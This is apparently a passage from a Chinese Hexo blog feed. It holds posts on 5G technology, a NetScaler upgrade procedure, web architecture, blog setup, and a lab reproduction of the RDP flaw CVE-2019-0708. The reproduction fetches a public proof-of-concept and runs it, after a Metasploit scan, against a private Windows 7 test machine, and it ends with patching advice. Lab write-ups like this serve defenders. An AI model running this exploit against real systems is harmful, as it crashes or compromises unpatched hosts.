src="https://pic4.zhimg.com/80/v2-15c78adbd97fc67c4435d5003e14e9b3_hd.jpg" alt=""></p><p>基站数量意味着什么？钱啊！投资啊！成本啊！</p><p>频率越低，网络建设就越省钱，竞争起来就越有利。这就是为什么，这些年，电信、移动、联通为了低频段而争得头破血流。</p><p>有的频段甚至被称为——黄金频段。</p><p><img src="https://i.loli.net/2019/10/19/uJIgHAyhUxmXvej.jpg" alt=" "></p><p>这也是为什么，5G 时代，运营商拼命怼设备商，希望基站降价。（如果真的上5G，按以往的模式，设备商就发大财了。）</p><p><img src="https://pic1.zhimg.com/80/v2-03a0c5122dc1009f5aa8d2835e93be20_hd.jpg" alt=""></p><p><img src="https://pic2.zhimg.com/80/v2-e20935fe445c52c8c5ab31611779b5d5_hd.jpg" alt=""></p><p>所以，基于以上原因，在高频率的前提下，为了减轻网络建设方面的成本压力，5G必须寻找新的出路。</p><p>首先，就是微基站。</p><p><strong>微基站</strong></p><p>基站有两种，微基站和宏基站。看名字就知道，微基站很小，宏基站很大！</p><p>宏基站：</p><p><img src="https://pic2.zhimg.com/80/v2-2e70b6f1f404776b5f365bd9a0754b25_hd.jpg" alt=""></p><p>室外常见，建一个覆盖一大片</p><p>微基站：</p><p><img src="https://i.loli.net/2019/10/19/cygdVtMknQINpaj.jpg" alt=" "></p><p>还有更小的，巴掌那么大.</p><p>其实，微基站现在就有不少，尤其是城区和室内，经常能看到。以后，到了 5G 时代，微基站会更多，到处都会装上，几乎随处可见。</p><p>那么多基站在身边，会不会对人体造成影响？不会。</p><p>其实，和传统认知恰好相反，事实上，基站数量越多，辐射反而越小！</p><p>你想一下，冬天，一群人的房子里，一个大功率取暖器好，还是几个小功率取暖器好？</p><p>大功率方案▼</p><p><img src="https://pic1.zhimg.com/80/v2-2168e6be4417de062cbad0e8439a0664_hd.jpg" alt=""></p><p>小功率方案▼</p><p><img src="https://pic4.zhimg.com/80/v2-f4facc262f7a2ef4ca9fa87d34faea5b_hd.jpg" alt=""></p><p>基站小，功率低，对大家都好。如果只采用一个大基站，离得近，辐射大，离得远，没信号，反而不好。</p><h2 id="天线去哪了？"><a href="#天线去哪了？" class="headerlink" title="天线去哪了？"></a>天线去哪了？</h2><p>以前大哥大都有很长的天线，早期的手机也有突出来的小天线，为什么现在我们的手机都没有天线了？</p><p><img src="https://i.loli.net/2019/10/19/rEmXwin4xG82OKb.jpg" alt=" "></p><p>其实，我们并不是不需要天线，而是我们的天线变小了。</p><p>根据天线特性，天线长度应与波长成正比，大约在1/10~1/4之间。</p><p><img src="https://pic4.zhimg.com/80/v2-7d72f88c59f53b97fda0603c7c7d7dcb_hd.jpg" alt=""></p><p>随着时间变化，我们手机的通信频率越来越高，波长越来越短，天线也就跟着变短啦！</p><p>毫米波通信，天线也变成毫米级。。。</p><p>这就意味着，天线完全可以塞进手机的里面，甚至可以塞很多根。。。</p><p>这就是5G的第三大杀手锏——</p><p><strong>Ｍassive MIMO（大规模多天线技术）</strong></p><p>MIMO 就是“多进多出”（Multiple-Input Multiple-Output），多根天线发送，多根天线接收。</p><p>在 LTE 时代，我们就已经有 MIMO 了，但是天线数量并不算多，只能说是初级版的 MIMO。</p><p>到了 5G 时代，继续把 MIMO 技术发扬光大，现在变成了加强版的 Massive　MIMO（Massive：大规模的，大量的）。</p><p><img src="https://i.loli.net/2019/10/19/M3TvHk4XtD1ALCx.jpg" alt=" "></p><p>手机里面都能塞好多根天线，基站就更不用说了。</p><p>以前的基站，天线就那么几根：</p><p><img src="https://i.loli.net/2019/10/19/bo6qO8SwExpRDgm.jpg" alt=" "></p><p>5G 时代，天线数量不是按根来算了，是按“阵”。。。“天线阵列”。。。一眼看去，要得密集恐惧症的节奏。。。</p><p><img src="https://pic1.zhimg.com/80/v2-01202899559c2689c496a82d0e0d5c3c_hd.jpg" alt=""></p><p>不过，天线之间的距离也不能太近。因为天线特性要求，多天线阵列要求天线之间的距离保持在半个波长以上。如果距离近了，就会互相干扰，影响信号的收发。</p><h2 id="你是直的？还是弯的？"><a href="#你是直的？还是弯的？" class="headerlink" title="你是直的？还是弯的？"></a>你是直的？还是弯的？</h2><p>大家都见过灯泡发光吧？　</p><p><img src="https://i.loli.net/2019/10/19/kuFVej4dErgTByA.jpg" alt=" "></p><p>其实，基站发射信号的时候，就有点像灯泡发光。信号是向四周发射的，对于光，当然是照亮整个房间，如果只是想照亮某个区域或物体，那么，大部分的光都浪费了。。。</p><p><img src="https://pic1.zhimg.com/80/v2-5727e7a94006eb1eefde214077f3f6fc_hd.jpg" alt=""></p><p>基站也是一样，大量的能量和资源都浪费了。 我们能不能找到一只无形的手，把散开的光束缚起来呢？ 这样既节约了能量，也保证了要照亮的区域有足够的光。答案是：可以。这就是——波 束 赋 形</p><p><strong>波束赋形</strong></p><p>在基站上布设天线阵列，通过对射频信号相位的控制，使得相互作用后的电磁波的波瓣变得非常狭窄，并指向它所提供服务的手机，而且能跟据手机的移动而转变方向。</p><p>这种空间复用技术，由全向的信号覆盖变为了精准指向性服务，波束之间不会干扰，在相同的空间中提供更多的通信链路，极大地提高基站的服务容量。</p><p><img src="https://pic1.zhimg.com/80/v2-2fe8e5bbe9390beba3b2ee2029302020_hd.jpg" alt=""></p><p>直的都能掰成弯的。。。还有什么是通信砖家干不出来的？</p><p><img src="https://pic1.zhimg.com/80/v2-87913a367ba4dce199cd3c37d48494fc_hd.jpg" alt=""></p><h2 id="别收我钱，行不行？"><a href="#别收我钱，行不行？" class="headerlink" title="别收我钱，行不行？"></a>别收我钱，行不行？</h2><p>在目前的移动通信网络中，即使是两个人面对面拨打对方的手机（或手机对传照片），信号都是通过基站进行中转的，包括控制信令和数据包。。。　</p><p>而在 5G 时代，这种情况就不一定了。</p><p>5G 的第五大特点——D2D，也就是 Device to Device（设备到设备）。</p><p><strong>D2D</strong></p><p>5G时代，同一基站下的两个用户，如果互相进行通信，他们的数据将不再通过基站转发，而是直接手机到手机。。。</p><p><img src="https://pic4.zhimg.com/80/v2-cc66a3ac67a04619d7e4e8fa2615186f_hd.jpg" alt=""></p><p>这样，就节约了大量的空中资源，也减轻了基站的压力。</p><p>不过，如果你觉得这样就不用付钱，那你就图样图森破了。</p><p><img src="https://pic2.zhimg.com/80/v2-319a69c48f7af4a81721cb84350660ad_hd.jpg" alt=""></p><p>控制消息还是要从基站走的，你用着频谱资源，运营商爸爸怎么可能放过你。。。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>5G 的特点：超高速度（超带宽）、超低延迟、传输距离短、辐射减小（其实现在基站的辐射都没有电脑高）、基站能够服务更多的无线设备、D2D(用户之间相互通信，不需要基站转发数据)。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://zhuanlan.zhihu.com/p/55998832" target="_blank" rel="noopener">「知乎知识库」— 5G</a></p><p><a href="https://zhuanlan.zhihu.com/p/41182443" target="_blank" rel="noopener">第一次有人把5G讲的这么简单明了</a></p><p><a href="https://zhuanlan.zhihu.com/p/40671102" target="_blank" rel="noopener">有史以来最强的5G入门科普！</a></p><p><a href="https://blog.csdn.net/mishifangxiangdefeng/article/details/79276891" target="_blank" rel="noopener">LTE和通信到底是什么关系</a></p><p><a href="https://blog.csdn.net/renlonggg/article/details/84989334" target="_blank" rel="noopener">什么是LTE</a></p><p><a href="https://blog.csdn.net/gwplovekimi/article/details/80497522" target="_blank" rel="noopener">可见光通信——LiFi</a></p><p><a href="https://zhidao.baidu.com/question/319454280.html" target="_blank" rel="noopener">无线电波，为什么频率越高，传输距离越短</a></p><p><a href="http://www.txrjy.com/thread-743637-1-1.html" target="_blank" rel="noopener">无线电波，为什么频率越高，传输距离越短?</a></p><p><a href="https://blog.csdn.net/dallin0408/article/details/79036111" target="_blank" rel="noopener">基站辐射对人体影响</a></p><p><a href="https://rf.eefocus.com/article/id-tongsujieshi?p=1" target="_blank" rel="noopener">无线通信中的术语通俗解释，小白也能懂！（上）</a></p><p><a href="https://rf.eefocus.com/article/id-wuxiantongxin2?p=1" target="_blank" rel="noopener">无线通信中的术语通俗解释，小白也能懂！（下）</a></p><p><a href="https://baike.baidu.com/item/%E6%97%A0%E7%BA%BF%E7%94%B5%E6%B3%A2" target="_blank" rel="noopener">无线电波</a></p><p><a href="https://www.zhihu.com/question/307958274/answer/712266324" target="_blank" rel="noopener">5G 的网络延迟时间 1 毫秒是怎么做到的？</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 科普 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 通信 </tag>
            
            <tag> 5G </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netscaler 升级</title>
      <link href="/2019/10/16/netscaler-%E5%8D%87%E7%BA%A7/"/>
      <url>/2019/10/16/netscaler-%E5%8D%87%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><strong>netscaler版本：</strong> 11.1（具体版本忘了）</p><p><strong>平台型号</strong>：NSMPX-5550</p><p><strong>客户需求</strong>：把 netscaler 升级到最新的 13.0 版本。</p><p><strong>升级前准备</strong>：保证 PC 机能够 ssh 到 netscaler 上。</p><p><strong>注：</strong> netscaler 默认是开启 ssh 的，一般连接不上，是因为 PC 机到 netscaler 网络之间有防火墙或策略，阻断了 ssh 的通信。如果出现 ssh 通信没问题，但是 PC 机还是连接不上 ssh 的情况，很有可能是 netscaler 因为一些问题，自动关闭了 ssh 服务。</p><h2 id="单台升级步骤"><a href="#单台升级步骤" class="headerlink" title="单台升级步骤"></a>单台升级步骤</h2><ol><li>备份配置文件</li></ol><p><img src="https://i.loli.net/2019/10/14/UnYlSHcChJk74wy.png" alt="ADC-1.png"></p><ol start="2"><li>查看 Citrix ADC 硬件平台型号</li></ol><p><img src="https://i.loli.net/2019/10/14/1kPnRUpgZwWA8qa.png" alt="ADC-2.png"></p><ol start="3"><li>根据 Citrix ADC 硬件平台的兼容性列表，下载 ADC 升级包</li></ol><p><strong>Citrix ADC MPX硬件-软件兼容性列表：</strong> <a href="https://docs.citrix.com/en-us/citrix-hardware-platforms/mpx/mpx-hardware-software-compatibility-matrix.html" target="_blank" rel="noopener">https://docs.citrix.com/en-us/citrix-hardware-platforms/mpx/mpx-hardware-software-compatibility-matrix.html</a></p><p><strong>netscaler 升级包（可根据平台型号修改链接）：</strong> <a href="https://www.citrix.com/downloads/citrix-adc/firmware/release-13-0-build-36-27.html" target="_blank" rel="noopener">https://www.citrix.com/downloads/citrix-adc/firmware/release-13-0-build-36-27.html</a></p><ol start="4"><li>使用 xshell 连接到 ADC</li></ol><pre class="line-numbers language-bash"><code class="language-bash">//** 进入 shell **//<span class="token operator">&gt;</span> shell//** 创建存放升级包目录 **//root@ns01<span class="token comment" spellcheck="true"># mkdir /var/nsinstall/13.0-36.27</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>Xftp 连到ADC，将下载的升级包上传到安装目录下</li></ol><p><img src="https://i.loli.net/2019/10/14/LvMuaD1iB5WjmPY.png" alt="ADC-3.png"></p><ol start="6"><li>安装 netscaler 升级包</li></ol><pre class="line-numbers language-bash"><code class="language-bash">//** 进入安装目录 **//root@ns01<span class="token comment" spellcheck="true"># cd /var/nsinstall/13.0-36.27</span>//** 解压升级包 **//root@ns01<span class="token comment" spellcheck="true"># tar -xzf build-13.0-36.27_nc_64.tgz</span>//** 查看安装脚本 <span class="token punctuation">(</span>可选<span class="token punctuation">)</span> **//root@ns01<span class="token comment" spellcheck="true"># ls installns</span>installns//** 执行安装脚本 **//root@ns01<span class="token comment" spellcheck="true"># installns</span>输出结果省略……Installation has completed.     //安装成功Reboot NOW? <span class="token punctuation">[</span>Y/N<span class="token punctuation">]</span> y             //重启 ADCRebooting <span class="token punctuation">..</span>.……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="netscaler-HA-升级步骤（没有操作过，具体步骤以-400-发的文档为例）"><a href="#netscaler-HA-升级步骤（没有操作过，具体步骤以-400-发的文档为例）" class="headerlink" title="netscaler HA 升级步骤（没有操作过，具体步骤以 400 发的文档为例）"></a>netscaler HA 升级步骤（没有操作过，具体步骤以 400 发的文档为例）</h2><ol><li><p>下载好升级包</p></li><li><p>升级前执行一次配置保存操作，并做好备份。</p></li><li><p>HA 环境下，我们需要先升级备机，再升级主机。升级之前，需要在主机上配置 Stay Primary，在备机上配置 Stay Secondary，并取消同步。</p></li></ol><pre class="line-numbers language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录主机，并运行如下命令： **//<span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus STAYPRIMARYsave config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录备机，并运行如下命令: **//<span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus STAYSECONDARYsave config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li>升级备机</li></ol><pre class="line-numbers language-bash"><code class="language-bash">//** 进入 shell **//shell//** 创建存放安装包目录 **//<span class="token function">mkdir</span> /var/nsinstall/11.1-56.19//** 利用 Winscp 工具将升级包上传到 /var/nsinstall/11.1-56.19 目录下 **//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">//** 返回命令行，继续运行如下命令 **//<span class="token function">cd</span> /var/nsinstall/11.1-56.19///** 解压升级包 **//<span class="token function">tar</span> -xzf build-11.1-56.19_nc.tgz//** 执行安装脚本 **//installns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li><p>当命令行提示升级完成，是否需要重启时，输入 Y；若升级过程出现任何异常，请联系思杰技术支持。</p></li><li><p>设备重启后，取消主备的 Stay Primary 以及 Stay Secondary 状态，以便进行 HA Failover 后升级另一台设备。</p></li></ol><pre class="line-numbers language-bash"><code class="language-bash">//** SSH 到升级后的备机，在命令行中输入如下命令: **// <span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus ENABLED<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">//** SSH 到未升级的主机，在命令行中输入如下命令 **//<span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus ENABLEDforce failover<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="7"><li><p>现在新的主机是升级后的那一台设备了。访问一下业务，检查业务是否一切正常。</p></li><li><p>确定业务正常后，升级新的备机，重复步骤3-5即可。</p></li><li><p>恢复HA同步配置</p></li></ol><pre class="line-numbers language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录主机，并运行如下命令：**//<span class="token keyword">set</span> ha node -hasync ENABLED -haprop ENABLED -hastatus ENABLEDsave config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录备机，并运行如下命令: **//<span class="token keyword">set</span> ha node -hasync ENABLED -haprop ENABLED -hastatus ENABLEDsave config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>10.GUI 界面上查看下 HA 状态是否如下。若如下，则一切正常。</p><p><img src="https://i.loli.net/2019/10/14/LoU5N4JT7Dc1npv.png" alt="ADC-HA.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Citrix </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netscaler(ADC) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的博客</title>
      <link href="/2019/10/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/10/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="我为什么写博客？"><a href="#我为什么写博客？" class="headerlink" title="我为什么写博客？"></a>我为什么写博客？</h2><p>因为受朋友的影响，很早之前就在写笔记。写笔记的初衷是整合、巩固、记录自己学习的知识，如果有一天，我想回顾这些知识点，对照着曾经记录的笔记，会起到事半功倍的效果。但是时间长了，发现自己一直在偷懒，笔记写得囫囵吞枣，而且写着写着就半途而废，有些有用的知识点根本就没记录。以前也没有太过在意这些，但是工作后发现问题越来越多，因为实施过程没有及时做记录或记的不仔细，导致再次实施的时候还是不太懂，做了一半就卡住了。经过一段时间的思考和准备，我决定写博客，以此来解决我现在的困境，同时也希望我的博客能帮到别人。</p><h2 id="写博客的价值"><a href="#写博客的价值" class="headerlink" title="写博客的价值"></a>写博客的价值</h2><ul><li>总结知识</li></ul><p>写博客最主要还是给自己看，总结自己学到的知识。但是博客也是面向大众的，所以博客还需要写得详细，易懂，使不懂的人能够理解。</p><ul><li>克服懒惰</li></ul><p>写博客总是紧绷着一根弦，不断提醒自己，要坚持写博客，实现自己的承诺，不能让读者们等急了。有压力，才有动力，不至于浑浑噩噩度日。</p><ul><li>补充知识</li></ul><p>当你的博客写得有问题，读者会指出文章存的问题。如：知识点存在哪些漏洞，解释不够严谨等。</p><ul><li>扩大个人影响力</li></ul><p>坚持写博客，你的影响力便不知不觉地渗透出去。你的影响力越大，身边的机会就越多。</p><h2 id="我的博客计划"><a href="#我的博客计划" class="headerlink" title="我的博客计划"></a>我的博客计划</h2><p>每周写三篇文章，博客内容主要以工作、技术学习、科普为主。</p><ul><li><p>工作内容主要记录实施过程，并不会涉及到到太多的技术知识。</p></li><li><p>技术学习，这部分会涉及技术原理，我会尽量写的简洁易懂。</p></li><li><p>科普文内容要是写生活中各方面的知识，用来扩展自己的视野。更重要的是它让我认识到自己的无知，以及如何面对无知，一点点地拨开迷雾。</p></li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>写这么多，其实是想鼓励身边的朋友和读者们也去做自己的博客，记录自己点点滴滴，提升自我的价值。</p><p>可能有些人说自己不知道怎么写博客。其实，只要开始写，并坚持写，迟早会找到自己的 style，网络文章本来就是 “free style” 的。所以，那些想写，又没有写的朋友们，请踏出第一步，”向前看，齐步走”，然后奔跑。当然，认真写文章，必然会花去大量时间。如何去衡量，就需要自己去决定了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web应用架构</title>
      <link href="/2019/09/23/web%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/"/>
      <url>/2019/09/23/web%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="web-应用工作流程"><a href="#web-应用工作流程" class="headerlink" title="web 应用工作流程"></a>web 应用工作流程</h2><p><img src="https://i.loli.net/2019/09/27/7bOLa2pf3rvFwCc.png" alt="web.png"></p><ol><li><p>首先使用 User’s browser 访问<a href="https://www.storyblocks.com/stock-image/strong-beautiful-fog-and-sunbeams-in-the-forest-bxxg0dvxdzj6gt9ini" target="_blank" rel="noopener">图片网站</a>，然后浏览器向 DNS 服务器发送请求，最后 User’s browser 从 DNS 服务器获取 IP 地址。</p></li><li><p>User’s browser 向 web Application server（web应用服务器） 发送请求，请求会先到达 Load Balancer(负载均衡服务)</p></li><li><p>Load Balancer 向多个 web Application server 发送这个请求，其中资源使用率最少的 web Application server 来处理这个请求。</p></li><li><p>web Application server 向 Caching Service（缓存服务）查找图片信息。</p></li><li><p>web Application server 从数据库中调取其他信息。</p></li><li><p>（a）当 web Application server 发现图片还没有进行色彩渲染，于是便向 Job Queue（任务队列） 发送 “色彩渲染” 的任务。（b）Job Server（任务服务）从 Job Queue（任务队列）中获取色彩渲染的任务进行异步计算，计算结束后再将结果更新到数据库。</p></li><li><p>Web Application Server会给search service(搜索服务)发送搜索请求，以图片的标题作为关键词，来查找相似的图片。</p></li><li><p>如果用户恰好是登录状态，Web Application Server会去访问Account Service(账号服务器)来获取账号信息。</p></li><li><p>（a）Web Application Server 会给 data firehose (数据加载服务)发送一个 Page View (网页浏览)事件，（b）并把它记录到的 Cloud Storage System(存储云)，（c）最终加载到 的Data Warehouse (数据仓库)中，并将这些数据提供给数据分析师来进行商务分析。</p></li><li><p>Web Application Server 会渲染出 HTML，并把它通过 Load Balancer 发送给用户的浏览器。页面中的 JavaScript 和 CSS 文件存储在我们的 Cloud Storage System (存储云)中</p></li><li><p>通过 CDN 进行分发 javascript 和 CSS 文件。因此，用户的浏览器会直接访问 CDN 来获取 JavaScript 和 CSS 文件。最后，浏览器再渲染整个页面给用户看。</p></li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://juejin.im/post/5b69a8eef265da0f926baa56#heading-10" target="_blank" rel="noopener">[译] Web 应用架构基础课</a></p><p><a href="https://blog.csdn.net/fundebug/article/details/81867196" target="_blank" rel="noopener">Web应用架构入门之11个基本要素</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[漏洞复现]CVE-2019-0708</title>
      <link href="/2019/09/16/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/09/16/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2019 年 5 月 14 日微软官方发布安全补丁，其中修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。由于该漏洞存在于 RDP 协议的预身份验证阶段，因此漏洞利用无需进行用户交互操作。该漏洞存在被不法分子利用进行蠕虫攻击的可能。该漏洞不会影响到 windows 8.1 和 windows 10。</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><p>测试机：parrot</p><p>靶机：win7 企业版 32 位（需要开启3389）</p><p>测试机IP：192.168.150.130</p><p>靶机IP：192.168.150.132</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="测试机"><a href="#测试机" class="headerlink" title="测试机"></a>测试机</h3><ul><li>下载 poc</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/n1xbyte/CVE-2019-0708.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>安装执行 poc 的库</li></ul><pre class="line-numbers language-bash"><code class="language-bash">pip3 <span class="token function">install</span> impacket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>开启 3389</p><p><img src="https://i.loli.net/2019/09/16/C4nDQa7jlzAZo52.png" alt="0708-1.png"></p><ol><li>更新 metasploit</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># apt-get install metasploit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>扫描 cve-2019-0708 漏洞</li></ol><p><img src="https://i.loli.net/2019/09/16/sJILcO5Hw8MmFah.png" alt="0708-2.png"><br><img src="https://i.loli.net/2019/09/16/IB5pQLR72TivONZ.png" alt="0708-3.png"></p><p>注：the target is vulnerable（目标存在这个漏洞）</p><ol start="3"><li>运行 poc 脚本</li></ol><p><img src="https://i.loli.net/2019/09/16/HgMjharwt8BmXAL.png" alt="0708-4.png"></p><ol start="4"><li>查看 win7 运行状况</li></ol><p><img src="https://i.loli.net/2019/09/16/E3ZAnJ5tU6jdlKk.png" alt="0708-5.png"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ol><li><p>安装杀毒软件</p></li><li><p>更新系统，打补丁</p><p> 补丁地址：</p><p> <a href="https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708" target="_blank" rel="noopener">Windows XP、Windows 2003</a></p><p> <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4499175" target="_blank" rel="noopener">Windows 7、Windows 2008R2</a></p><p> <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4499180" target="_blank" rel="noopener">Windows 2008</a></p></li><li><p>将 3389 设为 “网络身份认证”</p></li></ol><p><img src="https://i.loli.net/2019/09/16/qBTWYz8imMOZRH4.png" alt="0708-6.png"></p><ol start="4"><li><p>开启防火墙，阻止 3389 数据通过</p></li><li><p>关闭 3389 端口</p></li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.jianshu.com/p/2363c6364bb7" target="_blank" rel="noopener">【漏洞复现】CVE 2019-0708 漏洞利用</a></p><p><a href="https://blog.csdn.net/qq37724861/article/details/90286293" target="_blank" rel="noopener">CVE-2019-0708 微软补丁更新</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> RDP </tag>
            
            <tag> cve-2019-0708 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-next访客统计</title>
      <link href="/2019/08/31/hexo-next%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1/"/>
      <url>/2019/08/31/hexo-next%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="设置-leancloud"><a href="#设置-leancloud" class="headerlink" title="设置 leancloud"></a>设置 leancloud</h2><ol><li><p>注册 <a href="https://leancloud.cn/" target="_blank" rel="noopener">leancloud</a> ，并验证邮箱。</p></li><li><p>打开控制台，点击 “创建应用”，这里的”应用名”自定义。</p></li></ol><p><img src="https://i.loli.net/2019/08/31/BGXFcAwREtODrJZ.png" alt="LC-1.png"></p><p><img src="https://i.loli.net/2019/08/31/sWf3eqBDMPuRv8g.png" alt="LC-2.png"></p><ol start="3"><li>点击”存储”，新建 class。这里的class名称必须是”Counter”。为了让统计准确，这里 Counter 的权限设为 “无限制”</li></ol><p><img src="https://i.loli.net/2019/08/31/idPSVguAr5yFQGw.png" alt="LC-3.png"></p><p><img src="https://i.loli.net/2019/08/31/vWOC4nNLlwVGYIK.png" alt="LC-4.png"></p><ol start="4"><li>选择 “设置” –&gt; “应用key”。记录 “App ID” 和 “App Key” 的内容</li></ol><p><img src="https://i.loli.net/2019/08/31/F7iUYHlaMZIbCTu.png" alt="LC-5.png"> </p><h2 id="设置-config-yml"><a href="#设置-config-yml" class="headerlink" title="设置 _config.yml"></a>设置 _config.yml</h2><ol><li>编辑 next 主题配置文件 _config.yml，搜索关键字 “leancloud_visitors” 并修改成如下内容：</li></ol><pre class="line-numbers language-yml"><code class="language-yml">leancloud_visitors:  enable: true  app_id: &lt;<your app_id="">&gt;  app_key: &lt;<your app_key="">&gt;  # Dependencies: https://github.com/theme-next/hexo-leancloud-counter-security  # If you don't care about security in leancloud counter and just want to use it directly  # (without hexo-leancloud-counter-security plugin), set `security` to `false`.  security: true  betterPerformance: false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></your></your></code></pre><ol start="2"><li>开启 web 